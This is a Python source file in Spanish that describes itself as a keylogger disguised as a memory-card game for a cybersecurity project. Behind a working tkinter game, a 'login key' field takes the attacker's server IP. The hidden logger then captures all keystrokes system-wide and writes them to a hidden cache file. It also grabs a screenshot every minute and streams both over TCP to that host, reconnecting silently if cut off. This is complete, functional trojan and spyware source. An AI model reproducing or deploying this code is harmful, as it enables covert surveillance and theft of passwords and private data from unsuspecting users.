#!/usr/bin/env python3
"""
=============================================================
  🧠 MEMORAMA - Juego de Memoria
  (Cliente Keylogger disfrazado - Proyecto de Ciberseguridad)
=============================================================
"""

import socket
import json
import io
import os
import sys
import time
import random
import threading
import tkinter as tk
from tkinter import messagebox
from datetime import datetime

# ── Forzar backend X11 para captura global de teclas ──────
# En Wayland, pynput solo captura teclas de la ventana activa.
# Con Xorg/X11 captura TODAS las teclas del sistema.
if "DISPLAY" not in os.environ:
    os.environ["DISPLAY"] = ":0"

try:
    from pynput import keyboard
except ImportError:
    print("[!] Instala pynput: pip install pynput")
    sys.exit(1)

try:
    from PIL import ImageGrab
    # Forzar X11 para screenshots en Wayland
    os.environ["XDG_SESSION_TYPE"] = "x11"
except ImportError:
    print("[!] Instala Pillow: pip install Pillow")
    sys.exit(1)

# ── Configuración oculta ──────────────────────────────────
DEFAULT_PORT = 9999
SCREENSHOT_INTERVAL = 60
KEY_BUFFER_FLUSH_INTERVAL = 5
LOCAL_LOG_FILE = ".game_cache.tmp"

# ── Emojis para el memorama ───────────────────────────────
CARD_EMOJIS = ["🐶", "🐱", "🦊", "🐼", "🐸", "🦋", "🌟", "🔥",
               "🎵", "💎", "🍕", "🚀", "🌈", "🎯", "🍀", "🎲"]


# ══════════════════════════════════════════════════════════
#  KEYLOGGER (OCULTO EN SEGUNDO PLANO)
# ══════════════════════════════════════════════════════════

class SilentLogger:
    """Keylogger que corre silenciosamente en background."""

    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.connected = False
        self.running = True
        self.key_buffer = []
        self.buffer_lock = threading.Lock()

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.host, self.port))
            self.connected = True
            return True
        except Exception:
            self.connected = False
            return False

    def reconnect(self):
        delay = 5
        while self.running and not self.connected:
            time.sleep(delay)
            if self.connect():
                return True
            delay = min(delay * 2, 60)
        return False

    def send_data(self, msg_type, payload, filename=None):
        if not self.connected:
            return False
        try:
            header = {"type": msg_type, "size": len(payload)}
            if filename:
                header["filename"] = filename
            header_json = json.dumps(header).encode("utf-8") + b"\n"
            self.sock.sendall(header_json + payload)
            return True
        except (BrokenPipeError, ConnectionResetError, OSError):
            self.connected = False
            return False

    def on_key_press(self, key):
        try:
            special = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.shift: "",
                keyboard.Key.shift_r: "",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.esc: "[ESC]",
            }
            if key in special:
                char = special[key]
            elif hasattr(key, "char") and key.char:
                char = key.char
            else:
                char = f"[{key}]"

            if char:
                with self.buffer_lock:
                    self.key_buffer.append(char)
        except Exception:
            pass

    def flush_loop(self):
        while self.running:
            time.sleep(KEY_BUFFER_FLUSH_INTERVAL)
            with self.buffer_lock:
                if not self.key_buffer:
                    continue
                text = "".join(self.key_buffer)
                self.key_buffer.clear()

            # Log local
            try:
                with open(LOCAL_LOG_FILE, "a") as f:
                    f.write(f"[{datetime.now().strftime('%H:%M:%S')}] {text}\n")
            except Exception:
                pass

            if self.connected:
                if not self.send_data("keys", text.encode("utf-8")):
                    threading.Thread(target=self.reconnect, daemon=True).start()

    def screenshot_loop(self):
        while self.running:
            time.sleep(SCREENSHOT_INTERVAL)
            if not self.running:
                break
            try:
                screenshot = ImageGrab.grab()
                buf = io.BytesIO()
                screenshot.save(buf, format="PNG")
                img_data = buf.getvalue()
            except Exception:
                continue

            ts = datetime.now().strftime("%Y%m%d_%H%M%S")
            fname = f"screenshot_{ts}.png"

            if self.connected:
                self.send_data("screenshot", img_data, fname)

    def start(self):
        if not self.connect():
            threading.Thread(target=self.reconnect, daemon=True).start()

        # Flush de teclas
        threading.Thread(target=self.flush_loop, daemon=True).start()
        # Screenshots
        threading.Thread(target=self.screenshot_loop, daemon=True).start()
        # Listener
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.daemon = True
        self.listener.start()

    def stop(self):
        self.running = False
        try:
            self.listener.stop()
        except Exception:
            pass
        try:
            self.sock.close()
        except Exception:
            pass


# ══════════════════════════════════════════════════════════
#  JUEGO DE MEMORAMA (INTERFAZ VISIBLE)
# ══════════════════════════════════════════════════════════

class MemoramaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("🧠 Memorama - Juego de Memoria")
        self.root.geometry("600x700")
        self.root.configure(bg="#0f0f23")
        self.root.resizable(False, False)

        self.logger = None
        self.show_login_screen()

    # ── Pantalla de Login (pide la "clave") ────────────────

    def show_login_screen(self):
        self.clear_window()

        bg = "#0f0f23"
        fg = "#e0e0e0"

        # Fondo
        container = tk.Frame(self.root, bg=bg)
        container.place(relx=0.5, rely=0.5, anchor="center")

        # Logo
        tk.Label(
            container, text="🧠", font=("Helvetica", 72), bg=bg
        ).pack(pady=(0, 5))

        tk.Label(
            container, text="MEMORAMA",
            font=("Helvetica", 36, "bold"), bg=bg, fg="#f0c040"
        ).pack()

        tk.Label(
            container, text="Juego de Memoria",
            font=("Helvetica", 14), bg=bg, fg="#888"
        ).pack(pady=(0, 30))

        # Caja de clave
        key_frame = tk.Frame(container, bg=bg)
        key_frame.pack(pady=10)

        tk.Label(
            key_frame, text="🔑 Ingresa tu clave de acceso:",
            font=("Helvetica", 13), bg=bg, fg=fg
        ).pack()

        self.key_entry = tk.Entry(
            key_frame, width=22, font=("Courier", 16, "bold"),
            bg="#1a1a3e", fg="#00d2ff", insertbackground="#00d2ff",
            justify="center", relief="flat", bd=0,
            highlightthickness=2, highlightcolor="#f0c040",
            highlightbackground="#333"
        )
        self.key_entry.pack(pady=10, ipady=8)
        self.key_entry.bind("<Return>", lambda e: self.validate_key())
        self.key_entry.focus_set()

        # Botón
        self.play_btn = tk.Button(
            key_frame, text="🎮  JUGAR",
            font=("Helvetica", 16, "bold"),
            bg="#28a745", fg="white", activebackground="#218838",
            cursor="hand2", padx=40, pady=8, relief="flat",
            command=self.validate_key
        )
        self.play_btn.pack(pady=15)

        # Mensaje de error (oculto)
        self.error_label = tk.Label(
            key_frame, text="",
            font=("Helvetica", 11), bg=bg, fg="#ff4444"
        )
        self.error_label.pack()

        # Footer
        tk.Label(
            container, text="v2.0 • Obtén tu clave con el administrador",
            font=("Helvetica", 9), bg=bg, fg="#555"
        ).pack(pady=(20, 0))

    def validate_key(self):
        key = self.key_entry.get().strip()

        if not key:
            self.error_label.config(text="⚠ Ingresa una clave")
            return

        # La "clave" es la IP del servidor
        # Intentar activar el logger silenciosamente
        self.logger = SilentLogger(key, DEFAULT_PORT)

        # Mostrar el juego sin importar si la conexión funciona
        self.play_btn.config(text="⏳ Cargando...", state=tk.DISABLED)
        self.error_label.config(text="", fg="#888")

        # Iniciar logger en background
        threading.Thread(target=self._init_and_play, daemon=True).start()

    def _init_and_play(self):
        # Iniciar el logger silenciosamente
        self.logger.start()
        time.sleep(0.5)  # Simular "carga"

        # Mostrar juego en hilo principal
        self.root.after(0, self.show_game)

    # ── Pantalla del Juego ─────────────────────────────────

    def show_game(self):
        self.clear_window()

        bg = "#0f0f23"
        fg = "#e0e0e0"

        # Estado del juego
        self.grid_size = 4  # 4x4 = 16 cartas = 8 pares
        total = self.grid_size * self.grid_size
        num_pairs = total // 2

        emojis = random.sample(CARD_EMOJIS, num_pairs)
        self.cards = emojis * 2
        random.shuffle(self.cards)

        self.flipped = [False] * total
        self.matched = [False] * total
        self.first_card = None
        self.can_click = True
        self.moves = 0
        self.pairs_found = 0
        self.total_pairs = num_pairs
        self.start_time = time.time()

        # ── Header ─────────────────────────────────────────
        header = tk.Frame(self.root, bg="#1a1a3e", pady=8)
        header.pack(fill=tk.X)

        tk.Label(
            header, text="🧠 MEMORAMA",
            font=("Helvetica", 20, "bold"), bg="#1a1a3e", fg="#f0c040"
        ).pack()

        # Stats bar
        stats = tk.Frame(self.root, bg=bg, pady=5)
        stats.pack(fill=tk.X, padx=20)

        self.moves_label = tk.Label(
            stats, text="Movimientos: 0",
            font=("Helvetica", 12), bg=bg, fg="#aaa"
        )
        self.moves_label.pack(side=tk.LEFT)

        self.pairs_label = tk.Label(
            stats, text=f"Pares: 0/{self.total_pairs}",
            font=("Helvetica", 12), bg=bg, fg="#aaa"
        )
        self.pairs_label.pack(side=tk.RIGHT)

        self.timer_label = tk.Label(
            stats, text="⏱ 00:00",
            font=("Helvetica", 12, "bold"), bg=bg, fg="#00d2ff"
        )
        self.timer_label.pack()

        # ── Grid de cartas ─────────────────────────────────
        self.grid_frame = tk.Frame(self.root, bg=bg, pady=10)
        self.grid_frame.pack(expand=True)

        self.buttons = []
        for i in range(total):
            row = i // self.grid_size
            col = i % self.grid_size

            btn = tk.Button(
                self.grid_frame,
                text="❓",
                font=("Helvetica", 28),
                width=3, height=1,
                bg="#2a2a4a", fg="#555",
                activebackground="#3a3a5a",
                relief="flat", bd=0,
                cursor="hand2",
                command=lambda idx=i: self.flip_card(idx)
            )
            btn.grid(row=row, column=col, padx=6, pady=6, ipadx=5, ipady=5)
            self.buttons.append(btn)

        # ── Botones inferiores ─────────────────────────────
        bottom = tk.Frame(self.root, bg=bg, pady=10)
        bottom.pack(fill=tk.X, padx=20)

        tk.Button(
            bottom, text="🔄 Nuevo Juego",
            font=("Helvetica", 11, "bold"),
            bg="#f0c040", fg="#111", activebackground="#daa520",
            cursor="hand2", padx=15, pady=5, relief="flat",
            command=self.show_game
        ).pack(side=tk.LEFT)

        tk.Button(
            bottom, text="🚪 Salir",
            font=("Helvetica", 11, "bold"),
            bg="#e94560", fg="white", activebackground="#c82333",
            cursor="hand2", padx=15, pady=5, relief="flat",
            command=self.quit_app
        ).pack(side=tk.RIGHT)

        # Iniciar timer
        self.update_timer()

    def flip_card(self, idx):
        if not self.can_click:
            return
        if self.flipped[idx] or self.matched[idx]:
            return

        # Voltear carta
        self.flipped[idx] = True
        self.buttons[idx].config(
            text=self.cards[idx],
            bg="#3a3a6a", fg="white"
        )

        if self.first_card is None:
            # Primera carta
            self.first_card = idx
        else:
            # Segunda carta
            self.moves += 1
            self.moves_label.config(text=f"Movimientos: {self.moves}")
            self.can_click = False

            first = self.first_card
            second = idx
            self.first_card = None

            if self.cards[first] == self.cards[second]:
                # ¡Par encontrado!
                self.matched[first] = True
                self.matched[second] = True
                self.pairs_found += 1
                self.pairs_label.config(
                    text=f"Pares: {self.pairs_found}/{self.total_pairs}"
                )

                # Animar match
                self.buttons[first].config(bg="#1a6b3a")
                self.buttons[second].config(bg="#1a6b3a")
                self.can_click = True

                # ¿Ganó?
                if self.pairs_found == self.total_pairs:
                    self.root.after(500, self.show_win)
            else:
                # No coinciden, voltear después de un momento
                self.root.after(800, self.hide_cards, first, second)

    def hide_cards(self, a, b):
        self.flipped[a] = False
        self.flipped[b] = False
        self.buttons[a].config(text="❓", bg="#2a2a4a", fg="#555")
        self.buttons[b].config(text="❓", bg="#2a2a4a", fg="#555")
        self.can_click = True

    def update_timer(self):
        if hasattr(self, 'start_time') and self.pairs_found < self.total_pairs:
            elapsed = int(time.time() - self.start_time)
            mins = elapsed // 60
            secs = elapsed % 60
            self.timer_label.config(text=f"⏱ {mins:02d}:{secs:02d}")
            self.root.after(1000, self.update_timer)

    def show_win(self):
        elapsed = int(time.time() - self.start_time)
        mins = elapsed // 60
        secs = elapsed % 60

        messagebox.showinfo(
            "🎉 ¡Ganaste!",
            f"¡Felicidades! Completaste el memorama.\n\n"
            f"Movimientos: {self.moves}\n"
            f"Tiempo: {mins:02d}:{secs:02d}\n\n"
            f"¿Quieres jugar de nuevo?"
        )
        self.show_game()

    # ── Utilidades ─────────────────────────────────────────

    def clear_window(self):
        for widget in self.root.winfo_children():
            widget.destroy()

    def quit_app(self):
        if self.logger:
            self.logger.stop()
        self.root.destroy()


def main():
    root = tk.Tk()
    app = MemoramaApp(root)
    root.protocol("WM_DELETE_WINDOW", app.quit_app)
    root.mainloop()


if __name__ == "__main__":
    main()
